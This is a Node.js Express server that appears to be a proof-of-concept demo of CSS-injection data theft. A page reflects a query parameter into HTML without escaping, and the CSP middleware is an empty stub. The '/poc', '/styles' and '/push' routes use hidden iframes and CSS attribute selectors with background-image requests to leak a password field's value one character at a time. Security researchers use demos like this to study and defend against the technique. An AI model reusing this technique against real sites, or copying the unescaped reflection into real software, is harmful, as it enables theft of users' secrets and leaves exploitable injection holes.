var express = require('express');
var app = express();

function nocache(req, res, next) {
  res.header('Cache-Control', 'private, no-cache, no-store, must-revalidate');
  res.header('Expires', '-1');
  res.header('Pragma', 'no-cache');
  next();
}

function csp(req, res, next) {
    next();
}

app.use(nocache);
app.use(csp);

var state = {
    currentValue: "",
    listeners: {}
};

app.use(express.static('public'));

app.get('/', function(req, res) {
    res.send(`<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8"/>
    <title>Document</title>
  </head>
  <body>
    <form action="">
      Sensitive data here: <input name="sensitive" type="password" value="V3ryS3cr3t"/>
    </form>

    <p>Fringilla est ullamcorper eget nulla facilisi etiam dignissim diam quis enim lobortis scelerisque fermentum dui faucibus in ornare? In hendrerit gravida rutrum quisque non tellus orci, ac auctor augue mauris.</p>
    <p>Fringilla est ullamcorper eget nulla facilisi etiam dignissim diam quis enim lobortis scelerisque fermentum dui faucibus in ornare? In hendrerit gravida rutrum quisque non tellus orci, ac auctor augue mauris.</p>
    <p>Fringilla est ullamcorper eget nulla facilisi etiam dignissim diam quis enim lobortis scelerisque fermentum dui faucibus in ornare? In hendrerit gravida rutrum quisque non tellus orci, ac auctor augue mauris.</p>

    <form action="">
      <input name="input" type="text" value="XSS here"/>
    </form>

    <p>${req.query.input || ""}</p>


    <a href="/poc">POC</a>
  </body>
</html>
`);

});

app.get('/poc', function(req, res) {
    var i = 0;

    state.currentValue = '';
    state.listeners = {};

    res.header('Content-Type', 'text/html');
    res.write("<p>Fetching value...</p>");

    var interval = setInterval(function() {
        var styles = `<link rel="stylesheet" href="/styles?i=${i}"/>`;

        res.write(`<iframe style="display: none" src="/?input=${escape(styles)}"></iframe>`);

        if(++i >= 10) {
            clearInterval(interval);
            setTimeout(function() {
                res.end("<p>Found: " + state.currentValue + "</p>");
            }, 200);
        }
    }, 200);

});

function generateCss(suffix, index) {
    var charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".split('');
    return charset.map((c) => `input[name=sensitive][value^="${state.currentValue + c}"]{background-image:url(/push?c=${c})} `).join('');
}

app.get('/styles', function(req, res) {
    var index = parseInt(req.query.i);

    res.header("Content-Type", "text/css");
    res.send(generateCss("", 0));
});

app.get('/push', function(req, res) {
    state.currentValue += req.query.c;

    res.send("ok");
});

app.listen(3000, function () {
    console.log('Example app listening on port 3000!');
});
